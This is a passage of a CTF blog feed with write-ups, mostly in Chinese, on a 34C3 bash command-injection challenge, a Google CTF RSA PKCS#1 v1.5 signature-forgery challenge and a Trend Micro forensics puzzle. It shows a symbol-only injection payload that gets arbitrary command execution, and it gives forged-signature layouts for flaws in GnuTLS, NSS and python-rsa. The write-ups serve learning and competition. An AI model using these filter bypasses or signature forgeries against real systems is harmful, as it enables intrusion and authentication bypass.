&lt;p&gt;flag: &lt;code&gt;flag{600291f9a05a1e78215aa48c9ff6a4b1bb207c2b4ffa66223fcc67c04281397f}&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/zerofs.c"&gt;exp.c&lt;/a&gt;  &lt;/p&gt;</content><category term="0CTF"></category><category term="Linux kernel"></category></entry><entry><title>34C3CTF 2017 MISC 162 minbashmaxfun</title><link href="https://ddaa.tw/34c3ctf_2017_misc_162_minbashmaxfun.html" rel="alternate"></link><published>2018-01-04T01:05:00+08:00</published><updated>2018-01-04T01:05:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2018-01-04:/34c3ctf_2017_misc_162_minbashmaxfun.html</id><summary type="html">&lt;p&gt;34C3 跟去年一樣是在上班時間舉辦&lt;br&gt;
沒什麼時間打，第二天的下班時間幾乎都在解這題&lt;br&gt;
這題應該是至今解過限制最多的 cmd injection 題目了...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目會把我們的 input 丟到 &lt;code&gt;execl("/bin/bash", "/bin/bash", "-c", input, NULL)&lt;/code&gt; 執行&lt;br&gt;
但 input 只能包含以下字元：&lt;code&gt;$ ( ) # ! { } &amp;lt; \ '&lt;/code&gt;&lt;br&gt;
而且執行前會把 stdin 先關掉，無法交互執行指令&lt;br&gt;
（後面會說明這有多靠北 = =）&lt;br&gt;
原本以為是類似 &lt;a href="http://pwnable.kr"&gt;pwnable.kr&lt;/a&gt; 的 &lt;strong&gt;cmd3&lt;/strong&gt;&lt;br&gt;
可以拿以前的 payload 來用...果然是太天真了 QQ&lt;br&gt;
這題比起 &lt;strong&gt;cmd3&lt;/strong&gt; 更困難的地方在於連路徑都無法使用&lt;br&gt;
不過，解題思路還是有相似之處  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cmd3&lt;/strong&gt; 也限制了輸入英數字，但可以用 &lt;code&gt;$((a+b))&lt;/code&gt; 的方式做出各種數字&lt;br&gt;
這題連運算符號也限制了 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;34C3 跟去年一樣是在上班時間舉辦&lt;br&gt;
沒什麼時間打，第二天的下班時間幾乎都在解這題&lt;br&gt;
這題應該是至今解過限制最多的 cmd injection 題目了...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目會把我們的 input 丟到 &lt;code&gt;execl("/bin/bash", "/bin/bash", "-c", input, NULL)&lt;/code&gt; 執行&lt;br&gt;
但 input 只能包含以下字元：&lt;code&gt;$ ( ) # ! { } &amp;lt; \ '&lt;/code&gt;&lt;br&gt;
而且執行前會把 stdin 先關掉，無法交互執行指令&lt;br&gt;
（後面會說明這有多靠北 = =）&lt;br&gt;
原本以為是類似 &lt;a href="http://pwnable.kr"&gt;pwnable.kr&lt;/a&gt; 的 &lt;strong&gt;cmd3&lt;/strong&gt;&lt;br&gt;
可以拿以前的 payload 來用...果然是太天真了 QQ&lt;br&gt;
這題比起 &lt;strong&gt;cmd3&lt;/strong&gt; 更困難的地方在於連路徑都無法使用&lt;br&gt;
不過，解題思路還是有相似之處  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cmd3&lt;/strong&gt; 也限制了輸入英數字，但可以用 &lt;code&gt;$((a+b))&lt;/code&gt; 的方式做出各種數字&lt;br&gt;
這題連運算符號也限制了...不過原理大同小異  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$#&lt;/code&gt; =&amp;gt; 0  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$#&lt;/code&gt; 的意思是參數的個數，這題沒有其餘的參數所以會是 0   &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$(($#&amp;lt;$$))&lt;/code&gt; =&amp;gt; 1&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$$&lt;/code&gt; 代表的是目前的 pid ，pid 會 &amp;gt; 0 所以可以得到 1&lt;/li&gt;
&lt;li&gt;後來看 write-up 學到 &lt;code&gt;${##}&lt;/code&gt; 就能得到 1 &lt;/li&gt;
&lt;li&gt;大括號前面加 &lt;code&gt;#&lt;/code&gt; 的用意是取得變數的長度&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$((1&amp;lt;&amp;lt;1))&lt;/code&gt; =&amp;gt; 2  &lt;ul&gt;
&lt;li&gt;shift 運算，bj4&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$((2#bbb))&lt;/code&gt; =&amp;gt; 任意數字&lt;ul&gt;
&lt;li&gt;將 bbb 以二進制轉換成數字&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接著就卡關了好一陣子，大概花了兩三小時 RTFM&lt;br&gt;
推薦超詳細的 bash 文件 &lt;a href="http://tldp.org/LDP/abs/html/abs-guide.html"&gt;Advanced Bash-Scripting Guide&lt;/a&gt;&lt;br&gt;
這題因為可用的字元超少，所以目標是先弄懂每個字元的功能&lt;br&gt;
早些時候 freetsubasa 提出了從 &lt;code&gt;$0&lt;/code&gt; 的得到 &lt;code&gt;bash&lt;/code&gt; 的思路&lt;br&gt;
但透過變數取得的數字會喪失原本的功能&lt;br&gt;
原本以為無法，結果在翻文件的過程發現 &lt;code&gt;${!#}&lt;/code&gt; 這個東西&lt;br&gt;
效果等同於 &lt;code&gt;$BASH_ARGV&lt;/code&gt;，其值會執行目前 script 的名稱&lt;br&gt;
前面提到這題的執行環境是 &lt;code&gt;/bin/bash -c input&lt;/code&gt;&lt;br&gt;
因此透過 &lt;code&gt;${!#}&lt;/code&gt; 我們可以取得 &lt;code&gt;/bin/bash&lt;/code&gt; 的字串  &lt;/p&gt;
&lt;p&gt;在正常的環境下，搞出 &lt;code&gt;/bin/bash&lt;/code&gt; 就可以執行 shell 了&lt;br&gt;
但這題因為把 stdin 給關了&lt;br&gt;
即使執行 &lt;code&gt;/bin/bash&lt;/code&gt; 也會立刻結束程序&lt;br&gt;
因此要能執行任意指令才能解這一題...&lt;br&gt;
透過 $ 編碼的數字無法在同一層 shell 解析&lt;br&gt;
但是可以將編碼餵給再次執行的 bash&lt;br&gt;
由第二層的 bash 來解析編碼&lt;br&gt;
這部分可以透過 pipe 來達成&lt;br&gt;
&lt;code&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/code&gt; 的用途是將任意字串交由前面的指令執行&lt;br&gt;
bash 可以用 &lt;code&gt;$'\ooo'&lt;/code&gt; 的形式來表達任意字元（ooo 是字元轉 ascii 的八進制）&lt;br&gt;
結合這兩者，我們就可以執行任意指令&lt;br&gt;
到目前為止，不算數字編碼的部分，payload 會長的像這樣：&lt;br&gt;
&lt;code&gt;${!#}&amp;lt;&amp;lt;&amp;lt;$'\154\163'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;上述的做法雖然已經可以執行任意指令，但不能給參數...&lt;br&gt;
原因將空白 pipe 進前面的指令，會被當成同一個參數內的東西&lt;br&gt;
沒辦法作為第二層 bash 分隔符號&lt;br&gt;
這邊的解決方式是傳入 &lt;code&gt;{a,b}&lt;/code&gt; 的語法&lt;br&gt;
會被 bash 自動擴展成兩個不同的參數 &lt;code&gt;a b&lt;/code&gt;&lt;br&gt;
也就是說， shell 裡輸入 &lt;code&gt;{ls,-al}&lt;/code&gt;&lt;br&gt;
效果等同於輸入 &lt;code&gt;ls -al&lt;/code&gt;&lt;br&gt;
至此，我們已經可以做到執行任意指令&lt;br&gt;
接下來就只要 &lt;code&gt;cat /flag&lt;/code&gt; 就可以拿到 flag 了~  &lt;/p&gt;
&lt;p&gt;...並不是&lt;br&gt;
flag 的權限是 root:root 400&lt;br&gt;
題目還準備了一個 setuid 的 &lt;code&gt;/get_flag&lt;/code&gt;&lt;br&gt;
要執行才能拿到 flag  ，但執行下去的結果是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please solve this little captcha:&lt;br&gt;
4202242116 + 2217953831 + 1255076993 + 3775205480 + 2795260270&lt;br&gt;
14245738690 != 0 :(  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不知道各位看官是不是還記得 stdin 已經被關閉了&lt;br&gt;
以目前的情況而言，我們必須在執行前就輸入好答案&lt;br&gt;
所以這個看似簡單的 captcha ，實際上是超靠北的問題&lt;br&gt;
為此我還將 &lt;code&gt;get_flag&lt;/code&gt; dump 出來分析看 captcha 有沒有辦法預測 XD  &lt;/p&gt;
&lt;p&gt;發現這個問題後，第一個想法是打 reverse shell 出來&lt;br&gt;
這樣就可以無視 stdin 被關掉的問題&lt;br&gt;
但發現目前的 payload 沒辦法在第二層 bash 裡面處理 pipe 符號 &lt;br&gt;
為了做到 fd 重導向，必須在第二層 bash 再次執行 &lt;code&gt;bash -c &amp;lt;cmd&amp;gt;&lt;/code&gt;&lt;br&gt;
結果解完 pipe 的問題才發現 sandbox 裡面沒有網路環境 囧&lt;br&gt;
因此 captcha 唯一的解法是透過 pipe 得到 &lt;code&gt;/get_flag&lt;/code&gt; 的 output&lt;br&gt;
計算完結果後在導回 &lt;code&gt;/get_flag&lt;/code&gt; 的 stdin  &lt;/p&gt;
&lt;p&gt;這部分解法就很多種了&lt;br&gt;
我想到的是透過 &lt;code&gt;tail&lt;/code&gt; 和 &lt;code&gt;tee&lt;/code&gt; 來達成：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;tail -F /tmp/log | /get_flag | tee /tmp/result &amp;amp;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;echo $answer &amp;gt; /tmp/log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat /tmp/result&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;不過 mike 大概早我五分鐘先解出來了 XD&lt;br&gt;
作法是上傳 elf，透過 elf 處理 pipe 的問題 &lt;br&gt;
官方的解法是用 &lt;code&gt;exec&lt;/code&gt; 和 pid 做 fd 重導向&lt;br&gt;
個人覺得 &lt;strong&gt;LosFuzzys&lt;/strong&gt; 的&lt;a href="https://losfuzzys.github.io/writeup/2017/12/30/34c3ctf-minbashmaxfun/"&gt;解法&lt;/a&gt;最漂亮&lt;br&gt;
可以在一行指令搞定  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;34C3_HAHAHA_you_bashed_it_You_truly_are_a_god_of_BASH&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/minbashmaxfun.py"&gt;exp.py&lt;/a&gt;&lt;/p&gt;</content><category term="3XC3CTF"></category><category term="Bash"></category><category term="CMD Injection"></category></entry><entry><title>Google CTF 2017 Crypto 201 RSA CTF Challenge</title><link href="https://ddaa.tw/gctf_crypto_201_rsa_ctf_challenge.html" rel="alternate"></link><published>2017-06-26T11:38:00+08:00</published><updated>2017-06-26T11:38:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2017-06-26:/gctf_crypto_201_rsa_ctf_challenge.html</id><summary type="html">&lt;p&gt;這題沒有解出來...不過學到很多關於 &lt;strong&gt;PKCS#1 v1.5&lt;/strong&gt; 的攻擊方式&lt;br&gt;
還是厚著臉皮寫了一篇 write up  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;PKCS#1 v1.5 是 RSA 的一種實際應用方式，詳細內容可以參考 RFC 2313&lt;sup id="fnref-rfc2313"&gt;&lt;a class="footnote-ref" href="#fn-rfc2313"&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;br&gt;
目的是將訊息 padding 後構造成數位簽章或數位信封使用的格式，大概會長得這樣：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;EB&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Encryption&lt;/span&gt; &lt;span class="n"&gt;block&lt;/span&gt; 
&lt;span class="n"&gt;BT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Block&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;01&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;02&lt;/span&gt;
&lt;span class="n"&gt;PS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Padding&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;
&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="n"&gt;Data&lt;/span&gt;

&lt;span class="n"&gt;EB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;BT&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;PS&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;本題是要找出是簽署 &lt;code&gt;challenge&lt;/code&gt; 這個字串的 signature &lt;br&gt;
因此接下來只看 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題沒有解出來...不過學到很多關於 &lt;strong&gt;PKCS#1 v1.5&lt;/strong&gt; 的攻擊方式&lt;br&gt;
還是厚著臉皮寫了一篇 write up  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;PKCS#1 v1.5 是 RSA 的一種實際應用方式，詳細內容可以參考 RFC 2313&lt;sup id="fnref-rfc2313"&gt;&lt;a class="footnote-ref" href="#fn-rfc2313"&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;br&gt;
目的是將訊息 padding 後構造成數位簽章或數位信封使用的格式，大概會長得這樣：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;EB&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Encryption&lt;/span&gt; &lt;span class="n"&gt;block&lt;/span&gt; 
&lt;span class="n"&gt;BT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Block&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;01&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;02&lt;/span&gt;
&lt;span class="n"&gt;PS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Padding&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;
&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  &lt;span class="n"&gt;Data&lt;/span&gt;

&lt;span class="n"&gt;EB&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;BT&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;PS&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="mi"&gt;00&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;D&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;本題是要找出是簽署 &lt;code&gt;challenge&lt;/code&gt; 這個字串的 signature &lt;br&gt;
因此接下來只看 BT = 01 的情況&lt;br&gt;
簽署 signature PS 會是 n 個 ff&lt;br&gt;
Data 會由兩部分組成，分別是 &lt;code&gt;ASN.1&lt;/code&gt;&lt;sup id="fnref-asn1"&gt;&lt;a class="footnote-ref" href="#fn-asn1"&gt;2&lt;/a&gt;&lt;/sup&gt; 和 &lt;code&gt;hash(m)&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ASN.1&lt;/code&gt; 取決於後面用哪一種 hash 演算法&lt;br&gt;
可以把他想像成 hash 演算法的特徵碼  &lt;/p&gt;
&lt;p&gt;PKCS#1 v1.5 本身沒有問題&lt;br&gt;
但是在兩個條件存在時，可以任意偽造任意訊息的 signature  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;RSA 產生 key pair 時使用了過小的 e (exponent)&lt;/li&gt;
&lt;li&gt;用了不正確的方式解析 signature&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;RSA 的加密方式是 &lt;code&gt;c = m ** e % N&lt;/code&gt;&lt;br&gt;
如果 e 太小，導致 &lt;code&gt;m ** e &amp;lt; N&lt;/code&gt; 成立，解密就可以化簡成:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;已知 m、N、e，求 c 的 e 次方根  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;對 PKCS#1 v1.5 而言也有類似的問題，由於格式固定&lt;br&gt;
如果知道 public key 的長度和 message，我們可以推出 RSA 加密後的 signature 會是：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;EB = 0001 + ff * n + 00 + ASN.1 + hash(m)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;n 取決於 public key 的長度，假設長度是 1024，就要 padding 91 個 ff&lt;br&gt;
如果 e 太小而且&lt;code&gt;EB&lt;/code&gt; 剛好是 e 次方數，signature 就是 &lt;code&gt;EB&lt;/code&gt; 開 e 次方根&lt;br&gt;
(不太確定在正確 padding 的情況下，&lt;code&gt;EB&lt;/code&gt; 是不是不可能會是 e 次方數)  &lt;/p&gt;
&lt;p&gt;本題在原始碼中附上了 public key&lt;br&gt;
N = 1024 bit，e = 3&lt;br&gt;
想當然，這題的 &lt;code&gt;EB&lt;/code&gt; 不是一個立方數 XD&lt;br&gt;
因此還需要條件 2 才有辦法成功偽造 &lt;code&gt;challenge&lt;/code&gt; 的 signature  &lt;/p&gt;
&lt;p&gt;關於 PKCS#1 v1.5 的攻擊最早由 &lt;strong&gt;Bleichenbacher&lt;/strong&gt; 提出&lt;sup id="fnref-Bleichenbacher"&gt;&lt;a class="footnote-ref" href="#fn-Bleichenbacher"&gt;3&lt;/a&gt;&lt;/sup&gt; (疑似是這題的出題者)&lt;br&gt;
其中一種方式是 &lt;strong&gt;Chosen Cipher Attacks&lt;/strong&gt;&lt;br&gt;
後來有人把各種因為實作上的缺陷而產生的攻擊方式整理成一篇論文&lt;sup id="fnref-sigflaw"&gt;&lt;a class="footnote-ref" href="#fn-sigflaw"&gt;4&lt;/a&gt;&lt;/sup&gt;  &lt;/p&gt;
&lt;p&gt;由於本題沒有給 server 端的 source code&lt;br&gt;
因此我們不曉得條件 2 是因為如何實作而導致的&lt;br&gt;
準確地說，我們甚至不能確定條件 2 是否存在&lt;br&gt;
因此只能靠猜測的方式，亂送各種因為實作上缺陷而可以偽造的 signature 給 server  &lt;/p&gt;
&lt;p&gt;以下是可能的幾種實作缺陷：&lt;/p&gt;
&lt;h3&gt;1. Bleichenbacher’s Low-Exponent Attack&lt;/h3&gt;
&lt;p&gt;此方式是最早提出的攻擊手段&lt;br&gt;
原因是實作時沒有驗證是否有額外的資料在 &lt;code&gt;hash(m)&lt;/code&gt; 之後&lt;br&gt;
假設題目是此種實作缺陷，可以送這種格式讓 server 解密：&lt;br&gt;
&lt;code&gt;0001 + ff*91 + 00 + ASN.1 + hash(m) + evil&lt;/code&gt;&lt;br&gt;
由於 evil 是在放在 payload 的最後，有很大的機率可以將 payload 補成一個立方數&lt;br&gt;
不過此題不是這種實作缺陷&lt;br&gt;
這種攻擊方式要在 key 長度在 3072 以上才保證一定成功&lt;br&gt;
1024 會有無法成功補成立方數的可能  &lt;/p&gt;
&lt;h3&gt;2. Variants for Smaller RSA Moduli&lt;/h3&gt;
&lt;p&gt;此方式是因為沒有正確檢查 &lt;code&gt;EB&lt;/code&gt; 的長度&lt;br&gt;
由於 &lt;code&gt;ASN.1&lt;/code&gt; 長度不固定的原因&lt;br&gt;
有些實作方式不會正確檢查 ff 的個數&lt;br&gt;
只檢查總長度為 8 的倍數&lt;br&gt;
因此我們有機會透過調整 ff 的個數把 payload 控制成一個立方數&lt;br&gt;
不過這題也不是考這種利用方式&lt;br&gt;
試了一下在此題結尾必須是 &lt;code&gt;md5("challenge")&lt;/code&gt; 的情況下&lt;br&gt;
不管怎麼刪減都沒辦法做出有效的 payload  &lt;/p&gt;
&lt;h3&gt;3. Exploiting the Algorithm Parameters Field&lt;/h3&gt;
&lt;p&gt;最早被提出是在 CVE-2006-4339&lt;sup id="fnref-cve-2006-4339"&gt;&lt;a class="footnote-ref" href="#fn-cve-2006-4339"&gt;5&lt;/a&gt;&lt;/sup&gt;，GnuTLS 的實作缺陷&lt;br&gt;
GnuTLS 在某段程式碼中假設傳進來的 payload 一定是用 md5 做 hash 的 &lt;code&gt;EB&lt;/code&gt;&lt;br&gt;
完全沒有檢查 &lt;code&gt;ASN.1&lt;/code&gt; 的內容是否正確&lt;br&gt;
因此可以透過調整 &lt;code&gt;ASN.1&lt;/code&gt; 欄位的內容讓 EB 變成一個立方數&lt;br&gt;
論文中衍伸了 CVE-2006-4339 提到的攻擊手法&lt;br&gt;
並將條件改成有分段檢查 &lt;code&gt;ASN.1&lt;/code&gt; 的欄位&lt;br&gt;
問題變成可以用不同的 hash 算法混淆判斷來製造立方數&lt;br&gt;
這題我嘗試了 &lt;code&gt;CVE-2006-4339&lt;/code&gt; 的實作缺陷，也不成功&lt;br&gt;
論文提到的衍伸方式利用條件太嚴謹了，看起來這題就做不到 XD  &lt;/p&gt;
&lt;h3&gt;4. Attack Variant against the Netscape Security Services&lt;/h3&gt;
&lt;p&gt;這個實作缺陷最早是發現在 NSS 的原始碼&lt;br&gt;
原因跟 2. 有點類似，但是變成完全不檢查 ff&lt;br&gt;
由於 PKCS#1 v1.5 是向右對齊&lt;br&gt;
NSS 的實作方式從右邊檢查完 &lt;code&gt;hash(m)&lt;/code&gt;、&lt;code&gt;ASN.1&lt;/code&gt; 以後&lt;br&gt;
就檢查是否用 &lt;code&gt;00&lt;/code&gt; 分隔和 &lt;code&gt;0001&lt;/code&gt; 結尾&lt;br&gt;
因此可以送以下格式的 payload 來偽造：&lt;br&gt;
&lt;code&gt;0001 + 00 + evil + hash(m)&lt;/code&gt;&lt;br&gt;
&lt;strong&gt;python-rsa&lt;/strong&gt; 也有發生過類似的問題 CVE-2016-1494&lt;sup id="fnref-cve-2016-1494"&gt;&lt;a class="footnote-ref" href="#fn-cve-2016-1494"&gt;6&lt;/a&gt;&lt;/sup&gt;&lt;br&gt;
差別是有多檢查 &lt;code&gt;ASN.1&lt;/code&gt;，因此要改成送這樣的格式：&lt;br&gt;
&lt;code&gt;0001 + 00 + evil + ASN.1 + hash(m)&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;本題考的是 CVE-2016-1494&lt;br&gt;
比賽中我也有嘗試這種做法...不過我是拿別人的 code 來改的
不確定是原本就寫錯了，還是我改壞了&lt;br&gt;
我沒辦法在 message 是 &lt;code&gt;challenge&lt;/code&gt; 的情況找出一組成功的解 Orz&lt;br&gt;
我就以為不是考這個了...&lt;br&gt;
比賽完自己重寫一遍，就有成功解出 flag 了 = =  &lt;/p&gt;
&lt;p&gt;在實作時有很重要的一點是，由於數字很大&lt;br&gt;
基本上不可能一個一個數字去試是不是立方數&lt;br&gt;
要透過 bit 枚舉的方式快速找出後綴符合 &lt;code&gt;ASN.1 + hash(m)&lt;/code&gt; 的數字&lt;br&gt;
然後用二分法找前綴符合 &lt;code&gt;000100&lt;/code&gt; 開頭的數字&lt;br&gt;
就可以解出 flag 了&lt;br&gt;
解完後往 server 送，server 就會吐 flag 在網頁上了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;CTF{zx2fn265ll7}&lt;/code&gt;&lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-rfc2313"&gt;
&lt;p&gt;PKCS #1: RSA Encryption, &lt;a href="https://tools.ietf.org/html/rfc2313"&gt;https://tools.ietf.org/html/rfc2313&lt;/a&gt;&amp;#160;&lt;a class="footnote-backref" href="#fnref-rfc2313" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-asn1"&gt;
&lt;p&gt;Abstract Syntax Notation One，定義於 X.208&amp;#160;&lt;a class="footnote-backref" href="#fnref-asn1" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-Bleichenbacher"&gt;
&lt;p&gt;&lt;a href="http://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf"&gt;http://archiv.infsec.ethz.ch/education/fs08/secsem/bleichenbacher98.pdf&lt;/a&gt;&amp;#160;&lt;a class="footnote-backref" href="#fnref-Bleichenbacher" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-sigflaw"&gt;
&lt;p&gt;&lt;a href="https://www.cdc.informatik.tu-darmstadt.de/reports/reports/sigflaw.pdf"&gt;https://www.cdc.informatik.tu-darmstadt.de/reports/reports/sigflaw.pdf&lt;/a&gt;&amp;#160;&lt;a class="footnote-backref" href="#fnref-sigflaw" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-cve-2006-4339"&gt;
&lt;p&gt;&lt;a href="https://lists.gnupg.org/pipermail/gnutls-dev/2006-September/001240.html"&gt;https://lists.gnupg.org/pipermail/gnutls-dev/2006-September/001240.html&lt;/a&gt;&amp;#160;&lt;a class="footnote-backref" href="#fnref-cve-2006-4339" title="Jump back to footnote 5 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-cve-2016-1494"&gt;
&lt;p&gt;&lt;a href="https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/"&gt;https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/&lt;/a&gt;&amp;#160;&lt;a class="footnote-backref" href="#fnref-cve-2016-1494" title="Jump back to footnote 6 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="PKCS#1 v1.5"></category><category term="RSA"></category><category term="CVE"></category><category term="Google CTF"></category></entry><entry><title>Trend Micro CTF 2017 write-ups</title><link href="https://ddaa.tw/tmctf_misc_2400_write_ups.html" rel="alternate"></link><published>2017-06-25T20:01:00+08:00</published><updated>2017-06-25T20:01:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2017-06-25:/tmctf_misc_2400_write_ups.html</id><summary type="html">&lt;p&gt;Our team &lt;code&gt;phddaa&lt;/code&gt; (what the f...) got 2400 points and 19th rank this year.&lt;br&gt;
We didn't spend too much time on this game because we think the competition is 48 hours. O__O&lt;br&gt;
There are several categories of challenges but I don't know how they distinguish.&lt;br&gt;
Almost of challenges need to …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Our team &lt;code&gt;phddaa&lt;/code&gt; (what the f...) got 2400 points and 19th rank this year.&lt;br&gt;
We didn't spend too much time on this game because we think the competition is 48 hours. O__O&lt;br&gt;
There are several categories of challenges but I don't know how they distinguish.&lt;br&gt;
Almost of challenges need to analyze and guess... Thus, I put this write up in &lt;strong&gt;misc&lt;/strong&gt; category.  &lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;Analysis-Offensive 100&lt;/h3&gt;
&lt;p&gt;The problem provided a binary named &lt;code&gt;Forensic_Encyption&lt;/code&gt;. The file type is &lt;code&gt;MS-DOS&lt;/code&gt; but it's not a real MS-DOS executable. After a liitle guessing, I found the binary is a zip file. We can get two files, &lt;code&gt;file_1&lt;/code&gt; and &lt;code&gt;file_2&lt;/code&gt; after extracted &lt;code&gt;Forensic_Encyption&lt;/code&gt;.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;file_1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;An image with jpeg format hide a string &lt;code&gt;VHVyaW5nX01hY2hpbmVfYXV0b21hdG9u&lt;/code&gt; in exif information.&lt;/li&gt;
&lt;li&gt;Decode the string with base64 and get &lt;code&gt;Turing_Machine_automaton&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file_2&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Another zip file.&lt;/li&gt;
&lt;li&gt;We can extract a text file &lt;code&gt;key.txt&lt;/code&gt; with the password &lt;code&gt;Turing_Machine_automaton&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
